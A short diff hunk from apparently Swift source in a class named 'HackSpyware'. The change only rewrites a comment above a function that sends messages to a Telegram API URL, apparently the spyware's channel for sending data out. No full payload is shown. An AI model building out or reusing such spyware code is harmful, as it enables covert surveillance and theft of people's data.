@@ -174,7 +174,7 @@ public class HackSpyware {
         }
     }
 
-    // Send message to Telegram without Alamofire
+    // send message to Telegram
     private func sendMessageToTelegram(message: String, completion: (() -> Void)? = nil) {
         guard let url = URL(string: telegramApiUrl) else {
             print("invalid telegram API URL")
